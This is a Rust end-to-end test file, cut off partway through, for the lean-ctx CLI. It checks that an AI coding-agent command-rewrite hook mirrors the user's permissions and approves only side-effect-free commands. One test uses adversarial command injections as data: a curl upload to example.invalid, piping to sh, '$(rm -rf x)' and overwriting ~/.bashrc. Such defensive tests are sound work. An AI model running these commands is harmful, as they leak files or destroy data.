//! E2E tests for shell detection, `LEAN_CTX_SHELL` override,
//! agent init (incl. antigravity alias), Windows path handling,
//! and pipe-guard (stdout not a terminal → bypass lean-ctx).
// noqa: SIZE_OK — single-responsibility E2E test module for the CLI binary.

use std::io::Write;
use std::process::{Command, Stdio};

fn lean_ctx_bin() -> String {
    env!("CARGO_BIN_EXE_lean-ctx").to_string()
}

fn run_with_env(
    args: &[&str],
    env_vars: &[(&str, &str)],
    stdin_data: Option<&str>,
) -> (String, String, i32) {
    let mut cmd = Command::new(lean_ctx_bin());
    cmd.args(args)
        .env("LEAN_CTX_DISABLED", "1")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    for (k, v) in env_vars {
        cmd.env(k, v);
    }

    let mut child = cmd.spawn().expect("failed to spawn lean-ctx");

    if let Some(data) = stdin_data {
        child
            .stdin
            .take()
            .unwrap()
            .write_all(data.as_bytes())
            .unwrap();
    }

    let output = child.wait_with_output().expect("failed to wait");
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let code = output.status.code().unwrap_or(1);
    (stdout, stderr, code)
}

fn no_claude_config() -> std::path::PathBuf {
    std::env::temp_dir().join("lean-ctx-hook-tests-no-claude-config")
}

fn run_hook_test(
    args: &[&str],
    env_vars: &[(&str, &str)],
    stdin_data: Option<&str>,
) -> (String, String, i32) {
    let mut cmd = Command::new(lean_ctx_bin());
    cmd.args(args)
        .env_remove("LEAN_CTX_DISABLED")
        // These scenarios exercise rewrite mode, not the developer's installed
        // deny/shadow policy. No global configuration is changed.
        .env("LEAN_CTX_SHELL_HOOK_MODE", "rewrite")
        .env("LEAN_CTX_TOOL_SURFACE", "mcp")
        // The hook mirrors the developer's Claude Code permissions; tests run
        // against none unless they pass their own (see `claude_env`).
        .env("CLAUDE_CONFIG_DIR", no_claude_config())
        .env("CLAUDE_PROJECT_DIR", no_claude_config())
        .env_remove("CLAUDE_CODE_SESSION_ID")
        .env_remove("CODEBUDDY_SESSION_ID")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    for (k, v) in env_vars {
        cmd.env(k, v);
    }

    let mut child = cmd.spawn().expect("failed to spawn lean-ctx");

    if let Some(data) = stdin_data {
        child
            .stdin
            .take()
            .unwrap()
            .write_all(data.as_bytes())
            .unwrap();
    }

    let output = child.wait_with_output().expect("failed to wait");
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let code = output.status.code().unwrap_or(1);
    (stdout, stderr, code)
}

fn assert_hook_command_suffix(actual: Option<&str>, expected_suffix: &str) {
    let actual = actual.expect("hook command should exist");
    assert!(
        actual.contains("lean-ctx"),
        "expected hook command to reference lean-ctx, got {actual:?}"
    );
    assert!(
        actual.ends_with(expected_suffix),
        "expected hook command to end with {expected_suffix:?}, got {actual:?}"
    );
}

#[test]
fn lean_ctx_shell_override_uses_specified_shell() {
    if cfg!(windows) {
        return; // /bin/sh not available on Windows
    }
    let (stdout, _stderr, code) = run_with_env(
        &["-c", "echo lean_ctx_shell_works"],
        &[("LEAN_CTX_SHELL", "/bin/sh")],
        None,
    );
    assert_eq!(code, 0, "should succeed with /bin/sh");
    assert!(
        stdout.contains("lean_ctx_shell_works"),
        "should see echo output: {stdout}"
    );
}

#[test]
fn lean_ctx_shell_override_bash() {
    if !std::path::Path::new("/bin/bash").exists() {
        return;
    }
    let (stdout, _stderr, code) = run_with_env(
        &["-c", "echo $BASH_VERSION"],
        &[("LEAN_CTX_SHELL", "/bin/bash")],
        None,
    );
    assert_eq!(code, 0, "should succeed with /bin/bash");
    assert!(!stdout.trim().is_empty(), "BASH_VERSION should be set");
}

#[test]
fn lean_ctx_shell_override_invalid_shell_fails() {
    let (_stdout, _stderr, code) = run_with_env(
        &["-c", "echo hello"],
        &[("LEAN_CTX_SHELL", "/nonexistent/shell")],
        None,
    );
    assert_ne!(code, 0, "should fail with nonexistent shell");
}

#[test]
fn shell_exec_simple_command() {
    let (stdout, _stderr, code) = run_with_env(&["-c", "echo hello_world"], &[], None);
    assert_eq!(code, 0);
    assert!(stdout.contains("hello_world"), "output: {stdout}");
}

#[test]
fn shell_exec_pipe_command() {
    if cfg!(windows) {
        return; // head -1 not available on Windows
    }
    let (stdout, _stderr, code) =
        run_with_env(&["-c", "echo 'line1\nline2\nline3' | head -1"], &[], None);
    assert_eq!(code, 0, "pipe should work");
    assert!(!stdout.trim().is_empty(), "should have output: {stdout}");
}

#[test]
fn shell_exec_and_chain() {
    let (stdout, _stderr, code) = run_with_env(&["-c", "echo first && echo second"], &[], None);
    assert_eq!(code, 0, "&& chain should work");
    assert!(stdout.contains("first"), "first: {stdout}");
    assert!(stdout.contains("second"), "second: {stdout}");
}

#[test]
fn shell_exec_semicolon_chain() {
    let (stdout, _stderr, code) = run_with_env(&["-c", "echo aaa; echo bbb"], &[], None);
    assert_eq!(code, 0, "; chain should work");
    assert!(stdout.contains("aaa"), "aaa: {stdout}");
    assert!(stdout.contains("bbb"), "bbb: {stdout}");
}

#[test]
fn shell_exec_subshell() {
    if cfg!(windows) {
        return; // $(...) subshell syntax varies on Windows
    }
    let (stdout, _stderr, code) = run_with_env(&["-c", "echo $(echo subshell_output)"], &[], None);
    assert_eq!(code, 0, "subshell should work");
    assert!(stdout.contains("subshell_output"), "subshell: {stdout}");
}

#[test]
fn shell_exec_env_var_expansion() {
    if cfg!(windows) {
        return; // $VAR syntax is bash-only; PowerShell uses $env:VAR
    }
    let (stdout, _stderr, code) = run_with_env(
        &["-c", "echo $TEST_LEAN_CTX_VAR"],
        &[("TEST_LEAN_CTX_VAR", "expanded_value")],
        None,
    );
    assert_eq!(code, 0);
    assert!(
        stdout.contains("expanded_value"),
        "env var expansion: {stdout}"
    );
}

#[test]
fn shell_exec_quoted_args() {
    let (stdout, _stderr, code) =
        run_with_env(&["-c", r#"echo "hello world with spaces""#], &[], None);
    assert_eq!(code, 0);
    assert!(
        stdout.contains("hello world with spaces"),
        "quoted args: {stdout}"
    );
}

#[test]
fn agent_init_antigravity_alias() {
    let tmpdir = tempfile::tempdir().expect("create tempdir");
    let home = tmpdir.path();

    let gemini_dir = home.join(".gemini");
    std::fs::create_dir_all(&gemini_dir).unwrap();

    let mut cmd = Command::new(lean_ctx_bin());
    cmd.args(["init", "--agent", "antigravity", "--global"])
        .env("HOME", home.to_str().unwrap())
        .env("LEAN_CTX_DISABLED", "1")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let output = cmd.output().expect("failed to run init");
    let stderr = String::from_utf8_lossy(&output.stderr);

    assert!(
        !stderr.contains("Unknown agent"),
        "antigravity should be recognized: {stderr}"
    );

    let hooks_dir = gemini_dir.join("hooks");
    if hooks_dir.exists() {
        let rewrite = hooks_dir.join("lean-ctx-rewrite-gemini.sh");
        assert!(rewrite.exists(), "rewrite script should be created");
        let content = std::fs::read_to_string(&rewrite).unwrap();
        assert!(
            content.contains("hookSpecificOutput"),
            "rewrite script should contain hook output format"
        );
    }
}

#[test]
fn agent_init_unknown_agent_fails() {
    let (_stdout, stderr, code) =
        run_with_env(&["init", "--agent", "nonexistent_agent"], &[], None);
    assert_ne!(code, 0, "unknown agent should fail");
    assert!(
        stderr.contains("Unknown agent"),
        "should say unknown: {stderr}"
    );
}

#[test]
fn codex_pretooluse_rewrites_read_only_bash_with_updated_input() {
    let input = r#"{"tool_name":"Bash","tool_input":{"command":"cat src/main.rs"},"command":"cat src/main.rs"}"#;
    let (stdout, stderr, code) = run_hook_test(&["hook", "codex-pretooluse"], &[], Some(input));
    assert_eq!(code, 0, "hook should rewrite without blocking: {stderr}");
    assert!(
        stderr.trim().is_empty(),
        "stderr should stay empty for non-blocking rewrites: {stderr}"
    );
    let parsed: serde_json::Value =
        serde_json::from_str(stdout.trim()).expect("stdout should contain hook JSON");
    // Codex applies updatedInput only with "allow"; read-only rewrites may carry it.
    assert_eq!(parsed["hookSpecificOutput"]["permissionDecision"], "allow");
    let command = parsed["hookSpecificOutput"]["updatedInput"]["command"]
        .as_str()
        .expect("updated command should be a string");
    assert!(
        command.contains(" read ") && command.contains("src/main.rs") && !command.contains(" -c "),
        "updated command should map cat onto lean-ctx read: {command}"
    );
}

/// Codex can only rewrite by approving, so only a command in the
/// side-effect-free set is rewritten (and approved); builds, tests and
/// writers are left to Codex's own approval flow.
#[test]
fn codex_pretooluse_approves_only_side_effect_free_rewrites() {
    let input =
        r#"{"tool_name":"Bash","tool_input":{"command":"git status"},"command":"git status"}"#;
    let (stdout, stderr, code) = run_hook_test(&["hook", "codex-pretooluse"], &[], Some(input));
    assert_eq!(code, 0, "{stderr}");
    let v: serde_json::Value = serde_json::from_str(stdout.trim()).expect("JSON");
    assert_eq!(
        v["hookSpecificOutput"]["permissionDecision"], "allow",
        "{v}"
    );
    let cmd = v["hookSpecificOutput"]["updatedInput"]["command"]
        .as_str()
        .unwrap_or("");
    assert!(
        cmd.contains("lean-ctx") && cmd.contains("git status"),
        "{v}"
    );

    for cmd in ["rm -rf build", "cargo test", "git status && cargo test"] {
        let input = format!(
            r#"{{"tool_name":"Bash","tool_input":{{"command":"{cmd}"}},"command":"{cmd}"}}"#
        );
        let (stdout, stderr, code) =
            run_hook_test(&["hook", "codex-pretooluse"], &[], Some(&input));
        assert_eq!(code, 0, "{cmd}: {stderr}");
        assert!(!stdout.contains("allow"), "{cmd}: {stdout}");
        assert!(!stdout.contains("updatedInput"), "{cmd}: {stdout}");
    }
}

fn claude_bash_payload(cmd: &str) -> String {
    serde_json::json!({
        "session_id": "s",
        "transcript_path": "/tmp/t.jsonl",
        "cwd": "/tmp",
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": { "command": cmd }
    })
    .to_string()
}

fn cursor_shell_payload(cmd: &str) -> String {
    serde_json::json!({
        "hook_event_name": "preToolUse",
        "tool_name": "Shell",
        "tool_input": { "command": cmd }
    })
    .to_string()
}

fn hook_rewrite_json(payload: &str) -> serde_json::Value {
    let (stdout, stderr, code) = run_hook_test(&["hook", "rewrite"], &[], Some(payload));
    assert_eq!(code, 0, "rewrite hook must fail open: {stderr}");
    serde_json::from_str(stdout.trim()).unwrap_or_else(|e| panic!("{e}: {stdout:?}"))
}

/// A command the hook does not rewrite must leave the host's permission flow
/// intact: a hook "allow" skips the user's prompt on Claude Code, Cursor and
/// Copilot CLI.
#[test]
fn hook_rewrite_not_rewritten_destructive_command_grants_nothing() {
    for payload in [
        claude_bash_payload("rm -rf build"),
        cursor_shell_payload("rm -rf build"),
    ] {
        let v = hook_rewrite_json(&payload);
        assert_eq!(v, serde_json::json!({}), "{payload}");
    }
}

/// Malformed input and non-shell tools fail open without a decision.
#[test]
fn hook_rewrite_malformed_and_foreign_tools_grant_nothing() {
    for payload in [
        "not json",
        r#"{"tool_name":"Write","tool_input":{"file_path":"x"}}"#,
    ] {
        let (stdout, _stderr, code) = run_hook_test(&["hook", "rewrite"], &[], Some(payload));
        assert_eq!(code, 0);
        assert_eq!(stdout.trim(), "{}", "{payload}");
    }
}

/// Claude Code: a rewrite is delivered as `updatedInput` without a
/// `permissionDecision`, so Claude's rules and prompt still decide — for a
/// read rewrite and for a `lean-ctx -c` wrap alike.
#[test]
fn hook_rewrite_claude_rewrites_keep_claude_permission_flow() {
    for cmd in ["cat src/main.rs", "git status"] {
        let v = hook_rewrite_json(&claude_bash_payload(cmd));
        let hook = &v["hookSpecificOutput"];
        assert_eq!(hook["hookEventName"], "PreToolUse", "{cmd}: {v}");
        assert!(hook.get("permissionDecision").is_none(), "{cmd}: {v}");
        assert!(hook["updatedInput"]["command"].is_string(), "{cmd}: {v}");
        assert!(v.get("decision").is_none(), "{cmd}: {v}");
    }
}

/// Cursor/Copilot only take a rewrite as an approval: a command in the
/// side-effect-free set is rewritten and approved, anything else passes
/// through unchanged to the host's own approval.
#[test]
fn hook_rewrite_cursor_approves_only_side_effect_free_commands() {
    let v = hook_rewrite_json(&cursor_shell_payload("cat src/main.rs"));
    assert_eq!(v["permission"], "allow", "{v}");
    let cmd = v["updated_input"]["command"].as_str().unwrap_or_default();
    assert!(cmd.contains(" read ") && !cmd.contains(" -c "), "{v}");

    let v = hook_rewrite_json(&cursor_shell_payload("git status"));
    assert_eq!(v["permission"], "allow", "{v}");
    assert_eq!(v["permissionDecision"], "allow", "{v}");
    let cmd = v["updated_input"]["command"].as_str().unwrap_or_default();
    assert!(
        cmd.contains("lean-ctx") && cmd.contains("git status"),
        "{v}"
    );
    assert_eq!(v["modifiedArgs"]["command"], cmd, "{v}");

    for risky in [
        "cargo test",
        "npm test",
        "make",
        "git status && cargo build",
        "rm -rf build",
    ] {
        let v = hook_rewrite_json(&cursor_shell_payload(risky));
        assert_eq!(v, serde_json::json!({}), "{risky}");
    }
}

/// A hermetic Claude Code environment: this session's id, a config dir with
/// `settings` as the user's settings.json, and an empty project.
fn claude_env(settings: &serde_json::Value) -> (tempfile::TempDir, Vec<(String, String)>) {
    let dir = tempfile::tempdir().expect("tempdir");
    let config = dir.path().join("config");
    let project = dir.path().join("project");
    std::fs::create_dir_all(&config).unwrap();
    std::fs::create_dir_all(&project).unwrap();
    std::fs::write(config.join("settings.json"), settings.to_string()).unwrap();
    let env = vec![
        ("CLAUDE_CODE_SESSION_ID".to_string(), "s".to_string()),
        (
            "CLAUDE_CONFIG_DIR".to_string(),
            config.display().to_string(),
        ),
        (
            "CLAUDE_PROJECT_DIR".to_string(),
            project.display().to_string(),
        ),
    ];
    (dir, env)
}

fn claude_mode_payload(cmd: &str, mode: &str) -> String {
    serde_json::json!({
        "session_id": "s",
        "transcript_path": "/tmp/t.jsonl",
        "cwd": "/tmp",
        "permission_mode": mode,
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": { "command": cmd }
    })
    .to_string()
}

fn claude_rewrite(settings: &serde_json::Value, cmd: &str, mode: &str) -> serde_json::Value {
    let (_dir, env) = claude_env(settings);
    let env: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    let payload = claude_mode_payload(cmd, mode);
    let (stdout, stderr, code) = run_hook_test(&["hook", "rewrite"], &env, Some(&payload));
    assert_eq!(code, 0, "{stderr}");
    serde_json::from_str(stdout.trim()).unwrap_or_else(|e| panic!("{e}: {stdout:?}"))
}

fn claude_decision(v: &serde_json::Value) -> Option<&str> {
    v["hookSpecificOutput"]["permissionDecision"].as_str()
}

/// "Mirror, don't grant" on Claude Code: the rewrite carries "allow" exactly
/// when Claude Code would have run the ORIGINAL command without a prompt.
/// (Each case uses its own command: the hook replays a duplicate fire of the
/// same command within a short window.)
#[test]
fn hook_rewrite_claude_mirrors_the_users_permissions() {
    let allow = serde_json::json!({"permissions": {"allow": ["Bash(cargo test *)"]}});
    let v = claude_rewrite(&allow, "cargo test --lib", "default");
    assert_eq!(claude_decision(&v), Some("allow"), "{v}");
    let cmd = v["hookSpecificOutput"]["updatedInput"]["command"]
        .as_str()
        .unwrap_or("");
    assert!(
        cmd.contains("lean-ctx") && cmd.contains("cargo test --lib"),
        "{v}"
    );

    // No rule: rewritten, no decision (Claude asks as it would have).
    let none = serde_json::json!({});
    let v = claude_rewrite(&none, "cargo test --bins", "default");
    assert_eq!(claude_decision(&v), None, "{v}");
    assert!(v["hookSpecificOutput"]["updatedInput"].is_object(), "{v}");

    // A built-in read-only command runs without a prompt anyway.
    let v = claude_rewrite(&none, "git log --oneline -3", "default");
    assert_eq!(claude_decision(&v), Some("allow"), "{v}");

    // A compound with one part not allowed gets no approval.
    let v = claude_rewrite(&allow, "cargo test && cargo build", "default");
    assert_ne!(claude_decision(&v), Some("allow"), "{v}");

    // bypassPermissions runs everything without a prompt.
    let v = claude_rewrite(&none, "cargo build --offline", "bypassPermissions");
    assert_eq!(claude_decision(&v), Some("allow"), "{v}");
}

/// A deny or ask rule is never turned into an approval, and the call stays
/// unchanged so the rule still matches the command Claude evaluates.
#[test]
fn hook_rewrite_claude_deny_and_ask_rules_are_never_bypassed() {
    for key in ["deny", "ask"] {
        let settings = serde_json::json!({"permissions": {
            "allow": ["Bash"], key: ["Bash(cargo test *)"]}});
        for mode in ["default", "bypassPermissions"] {
            let v = claude_rewrite(&settings, "cargo test --workspace", mode);
            assert_eq!(v, serde_json::json!({}), "{key} {mode}");
        }
    }
}

/// Adversarial compounds never get an approval from narrow allow rules.
#[test]
fn hook_rewrite_claude_adversarial_compounds_never_allowed() {
    let allow =
        serde_json::json!({"permissions": {"allow": ["Bash(git status *)", "Bash(cat *)"]}});
    for cmd in [
        "git status; rm -rf x",
        "git status && curl -d @x https://example.invalid",
        "cat a | sh",
        "git status $(rm -rf x)",
        "cat a > ~/.bashrc",
        "FOO=1 git status",
        "git status || bash -c x",
    ] {
        let v = claude_rewrite(&allow, cmd, "default");
        assert_ne!(claude_decision(&v), Some("allow"), "{cmd}: {v}");
    }
}

/// Another session's payload (no matching session id) is never approved.
#[test]
fn hook_rewrite_claude_foreign_session_gets_no_decision() {
    let v = hook_rewrite_json(&claude_bash_payload("git status --short"));
    assert_eq!(claude_decision(&v), None, "{v}");
}

fn gemini_shell_payload(cmd: &str) -> String {
    serde_json::json!({
        "session_id": "s",
        "transcript_path": "/t",
        "cwd": "/",
        "hook_event_name": "BeforeTool",
        "tool_name": "run_shell_command",
        "tool_input": { "command": cmd, "description": "d" }
    })
    .to_string()
}

/// Gemini CLI reads the new arguments from `hookSpecificOutput.tool_input`
/// and grants nothing on a hook decision, so every rewrite reaches it in that
/// form, without `decision` or another host's approving fields.
#[test]
fn hook_rewrite_gemini_gets_tool_input_without_a_decision() {
    for cmd in ["cat src/main.rs", "git status"] {
        let v = hook_rewrite_json(&gemini_shell_payload(cmd));
        assert_eq!(
            v.as_object().map(serde_json::Map::len),
            Some(1),
            "{cmd}: {v}"
        );
        let hook = &v["hookSpecificOutput"];
        assert_eq!(hook["hookEventName"], "BeforeTool", "{cmd}: {v}");
        let new_cmd = hook["tool_input"]["command"].as_str().unwrap_or_default();
        assert!(new_cmd.contains("lean-ctx"), "{cmd}: {v}");
        assert_eq!(hook["tool_input"]["description"], "d", "{cmd}: {v}");
        assert!(hook.get("updatedInput").is_none(), "{cmd}: {v}");
    }
    let v = hook_rewrite_json(&gemini_shell_payload("rm -rf build"));
    assert_eq!(v, serde_json::json!({}));
}

/// Gemini's file tools reject paths outside the workspace, so a redirect to
/// a LeanCTX temp file would fail every read: Gemini keeps its native read.
#[test]
fn hook_redirect_gemini_read_passes_through() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let file = tmp.path().join("main.rs");
    std::fs::write(&file, "fn main() {}\n".repeat(200)).unwrap();
    let payload = serde_json::json!({
        "session_id": "s",
        "transcript_path": "/t",
        "cwd": tmp.path(),
        "hook_event_name": "BeforeTool",
        "tool_name": "read_file",
        "tool_input": { "file_path": file }
    })
    .to_string();
    let (stdout, stderr, code) = run_hook_test(&["hook", "redirect"], &[], Some(&payload));
    assert_eq!(code, 0, "{stderr}");
    assert_eq!(stdout.trim(), "{}");
}

#[test]
fn agent_init_codex_installs_compatible_hooks_and_instructions() {
    let tmpdir = tempfile::tempdir().expect("create tempdir");
    let home = tmpdir.path();
    let codex_dir = home.join(".codex");
    std::fs::create_dir_all(&codex_dir).unwrap();

    let home_str = home.to_string_lossy().to_string();
    #[cfg(not(windows))]
    let envs = vec![("HOME", home_str.as_str())];
    #[cfg(windows)]
    let envs = vec![
        ("HOME", home_str.as_str()),
        ("USERPROFILE", home_str.as_str()),
    ];

    let (_stdout, stderr, code) =
        run_with_env(&["init", "--agent", "codex", "--global"], &envs, None);
    assert_eq!(code, 0, "codex init should succeed: {stderr}");

    assert!(
        codex_dir.join("AGENTS.md").exists(),
        "AGENTS.md should exist"
    );
    assert!(
        codex_dir.join("LEAN-CTX.md").exists(),
        "LEAN-CTX.md should exist"
    );

    let hooks: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(codex_dir.join("hooks.json")).unwrap())
            .expect("hooks.json should be valid");
    assert_hook_command_suffix(
        hooks["hooks"]["PreToolUse"][0]["hooks"][0]["command"].as_str(),
        "hook codex-pretooluse",
    );
    assert_hook_command_suffix(
        hooks["hooks"]["SessionStart"][0]["hooks"][0]["command"].as_str(),
        "hook codex-session-start",
    );

    let config = std::fs::read_to_string(codex_dir.join("config.toml")).unwrap_or_default();
    assert!(
        config.contains("hooks = true"),
        "init should enable Codex hook support"
    );
}

#[test]
fn agent_init_codex_migrates_legacy_lean_ctx_hook_but_keeps_other_hooks() {
    let tmpdir = tempfile::tempdir().expect("create tempdir");
    let home = tmpdir.path();
    let codex_dir = home.join(".codex");
    let hooks_dir = codex_dir.join("hooks");
    std::fs::create_dir_all(&hooks_dir).unwrap();

    std::fs::write(
        hooks_dir.join("lean-ctx-rewrite-codex.sh"),
        "#!/bin/sh\nexit 0\n",
    )
    .unwrap();
    std::fs::write(
        codex_dir.join("hooks.json"),
        serde_json::json!({
            "hooks": {
                "PreToolUse": [
                    {
                        "matcher": "Bash",
                        "hooks": [{
                            "type": "command",
                            "command": "lean-ctx hook rewrite",
                            "timeout": 15
                        }]
                    },
                    {
                        "matcher": "Bash",
                        "hooks": [{
                            "type": "command",
                            "command": "echo keep-me",
                            "timeout": 5
                        }]
                    }
                ],
                "PostToolUse": [
                    {
                        "matcher": "Bash",
                        "hooks": [{
                            "type": "command",
                            "command": "echo keep-post",
                            "timeout": 5
                        }]
                    }
                ]
            }
        })
        .to_string(),
    )
    .unwrap();

    let home_str = home.to_string_lossy().to_string();
    #[cfg(not(windows))]
    let envs = vec![("HOME", home_str.as_str())];
    #[cfg(windows)]
    let envs = vec![
        ("HOME", home_str.as_str()),
        ("USERPROFILE", home_str.as_str()),
    ];

    let (_stdout, stderr, code) =
        run_with_env(&["init", "--agent", "codex", "--global"], &envs, None);
    assert_eq!(code, 0, "codex init should succeed: {stderr}");

    assert!(
        !hooks_dir.join("lean-ctx-rewrite-codex.sh").exists(),
        "legacy Codex hook script should be removed"
    );

    let hooks: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(codex_dir.join("hooks.json")).unwrap())
            .expect("hooks.json should stay valid");
    let pre_tool_use = hooks["hooks"]["PreToolUse"]
        .as_array()
        .expect("PreToolUse should remain");
    assert_eq!(
        pre_tool_use.len(),
        2,
        "legacy hook should be replaced and custom hook preserved (deny is handled at runtime by codex-pretooluse)"
    );
    assert_eq!(
        pre_tool_use[0]["hooks"][0]["command"].as_str(),
        Some("echo keep-me")
    );
    assert_hook_command_suffix(
        pre_tool_use[1]["hooks"][0]["command"].as_str(),
        "hook codex-pretooluse",
    );
    assert_hook_command_suffix(
        hooks["hooks"]["SessionStart"][0]["hooks"][0]["command"].as_str(),
        "hook codex-session-start",
    );
    assert_eq!(
        hooks["hooks"]["PostToolUse"][0]["hooks"][0]["command"].as_str(),
        Some("echo keep-post")
    );
}

#[test]
fn agent_init_gemini_installs_antigravity_cli_plugin_hooks() {
    // GH #284: `gemini` setup also configures the Antigravity CLI MCP target, so
    // it must install the `agy` plugin hooks. `agy` reads hooks only from its
    // plugin dir (`~/.gemini/config/plugins/lean-ctx`), never from the legacy
    // `~/.gemini/settings.json` — so the plugin (not just MCP) must be written.
    let tmpdir = tempfile::tempdir().expect("create tempdir");
    let home = tmpdir.path();
    let home_str = home.to_string_lossy().to_string();
    #[cfg(not(windows))]
    let envs = vec![("HOME", home_str.as_str())];
    #[cfg(windows)]
    let envs = vec![
        ("HOME", home_str.as_str()),
        ("USERPROFILE", home_str.as_str()),
    ];

    let (_stdout, stderr, code) =
        run_with_env(&["init", "--agent", "gemini", "--global"], &envs, None);
    assert_eq!(code, 0, "gemini init should succeed: {stderr}");

    let plugin_hooks = home.join(".gemini/config/plugins/lean-ctx/hooks/hooks.json");
    assert!(
        plugin_hooks.exists(),
        "gemini init must install the Antigravity CLI plugin hooks at {plugin_hooks:?}"
    );
    let manifest = std::fs::read_to_string(home.join(".gemini/config/import_manifest.json"))
        .unwrap_or_default();
    assert!(
        manifest.contains("lean-ctx"),
        "the plugin must be registered in import_manifest.json: {manifest}"
    );
}

#[test]
fn agent_init_lists_antigravity_in_supported() {
    let (_stdout, stderr, _code) =
        run_with_env(&["init", "--agent", "nonexistent_agent"], &[], None);
    assert!(
        stderr.contains("antigravity"),
        "supported list should include antigravity: {stderr}"
    );
}

#[test]
fn agent_init_lists_grok_in_supported() {
    let (_stdout, stderr, _code) =
        run_with_env(&["init", "--agent", "nonexistent_agent"], &[], None);
    assert!(
        stderr.contains("grok"),
        "supported list should include grok: {stderr}"
    );
}

#[test]
fn agent_init_grok_writes_mcp_without_unsupported_hooks() {
    let tmpdir = tempfile::tempdir().expect("create tempdir");
    let home = tmpdir.path();
    std::fs::create_dir_all(home.join(".grok")).unwrap();
    std::fs::write(home.join(".grok/config.toml"), "[ui]\ntheme = \"test\"\n").unwrap();

    let home_str = home.to_string_lossy().to_string();
    #[cfg(not(windows))]
    let env = [("HOME", home_str.as_str()), ("LEAN_CTX_DISABLED", "1")];
    #[cfg(windows)]
    let env = [
        ("HOME", home_str.as_str()),
        ("USERPROFILE", home_str.as_str()),
        ("LEAN_CTX_DISABLED", "1"),
    ];

    let (stdout, stderr, code) = run_with_env(
        &["init", "--agent", "grok", "--global", "--mode", "hybrid"],
        &env,
        None,
    );
    assert_eq!(
        code, 0,
        "init --agent grok should succeed\nstdout={stdout}\nstderr={stderr}"
    );
    assert!(
        !stderr.contains("Unknown agent"),
        "grok should be recognized: {stderr}"
    );

    let config = std::fs::read_to_string(home.join(".grok/config.toml")).unwrap();
    assert!(
        config.contains("[mcp_servers.lean-ctx]"),
        "MCP section missing: {config}"
    );

    assert!(
        !home.join(".grok/hooks/lean-ctx.json").exists(),
        "Grok Build's documented integration is MCP-only; do not install an unverified hook format"
    );

    let skill = home.join(".grok/skills/lean-ctx/SKILL.md");
    assert!(skill.exists(), "SKILL.md should be installed at {skill:?}");

    // Global rules injection uses ~/.grok/AGENTS.md when the home is detected.
    // Under a temp HOME with only config.toml present, detection should succeed.
    let agents_md = home.join(".grok/AGENTS.md");
    if agents_md.exists() {
        let body = std::fs::read_to_string(&agents_md).unwrap();
        assert!(
            body.contains("lean-ctx"),
            "AGENTS.md should mention lean-ctx: {body}"
        );
    }
}

#[test]
fn hook_rewrite_works_with_shell_override() {
    let input = r#"{"tool_name":"Bash","command":"git status"}"#;
    let (stdout, _stderr, _code) = run_hook_test(
        &["hook", "rewrite"],
        &[("LEAN_CTX_SHELL", "/bin/sh")],
        Some(input),
    );
    if !stdout.trim().is_empty() {
        let v: serde_json::Value =
            serde_json::from_str(&stdout).expect("hook output should be valid JSON");
        assert!(
            v["hookSpecificOutput"]["updatedInput"]["command"]
                .as_str()
                .is_some(),
            "should have command field"
        );
    }
}

#[test]
fn hook_rewrite_disabled_produces_neutral_passthrough() {
    let input = r#"{"tool_name":"Bash","command":"git status"}"#;
    let (stdout, _stderr, code) = run_hook_test(
        &["hook", "rewrite"],
        &[("LEAN_CTX_DISABLED", "1")],
        Some(input),
    );
    let trimmed = stdout.trim();
    // Valid JSON for hosts that need it, but no permission decision: a
    // disabled hook must not approve the call.
    let v: serde_json::Value =
        serde_json::from_str(trimmed).expect("disabled hook output should be valid JSON");
    assert_eq!(v, serde_json::json!({}), "got: {stdout}");
    assert_eq!(code, 0, "disabled hook should exit cleanly");
}

#[test]
fn codex_pretooluse_disabled_exits_cleanly() {
    let input =
        r#"{"tool_name":"Bash","tool_input":{"command":"git status"},"command":"git status"}"#;
    let (stdout, _stderr, code) = run_hook_test(
        &["hook", "codex-pretooluse"],
        &[("LEAN_CTX_DISABLED", "1")],
        Some(input),
    );
    assert_eq!(code, 0, "disabled codex hook should not exit(2)");
    // Codex treats exit 0 with no output as "continue" (#1019: a bare
    // `permissionDecision: allow` is rejected), and a disabled hook must not
    // approve anything.
    assert!(stdout.trim().is_empty(), "disabled codex hook: {stdout}");
}

#[test]
fn generated_script_handles_windows_path() {
    let script = lean_ctx::hooks::generate_rewrite_script("/c/Users/Jaina/bin/lean-ctx.exe");
    assert!(
        script.contains("LEAN_CTX_BIN=\"/c/Users/Jaina/bin/lean-ctx.exe\""),
        "Windows bash path should be properly quoted in script"
    );
}

#[test]
fn generated_script_handles_path_with_spaces() {
    let script = lean_ctx::hooks::generate_rewrite_script("/c/Program Files/lean-ctx/lean-ctx.exe");
    assert!(
        script.contains("LEAN_CTX_BIN=\"/c/Program Files/lean-ctx/lean-ctx.exe\""),
        "path with spaces should be quoted"
    );
}

#[test]
fn generated_compact_script_handles_windows_path() {
    let script =
        lean_ctx::hooks::generate_compact_rewrite_script("/c/Users/Jaina/bin/lean-ctx.exe");
    assert!(
        script.contains("LEAN_CTX_BIN=\"/c/Users/Jaina/bin/lean-ctx.exe\""),
        "compact script should handle Windows path"
    );
}

#[test]
fn generated_script_skips_own_binary() {
    let script = lean_ctx::hooks::generate_rewrite_script("lean-ctx");
    assert!(
        script.contains("lean-ctx ") || script.contains("$LEAN_CTX_BIN "),
        "script should reference lean-ctx for self-skip check"
    );
}

#[test]
fn bash_script_with_windows_binary_path_produces_valid_json() {
    if cfg!(windows) {
        return; // bash not available on Windows CI
    }
    let script =
        lean_ctx::hooks::generate_compact_rewrite_script("/c/Users/Jaina/bin/lean-ctx.exe");
    let script_path =
        std::env::temp_dir().join(format!("lean_ctx_winpath_test_{}.sh", std::process::id()));
    std::fs::write(&script_path, &script).expect("write script");

    let input = r#"{"tool_name":"Bash","command":"git status"}"#;
    let mut child = Command::new("bash")
        .arg(&script_path)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
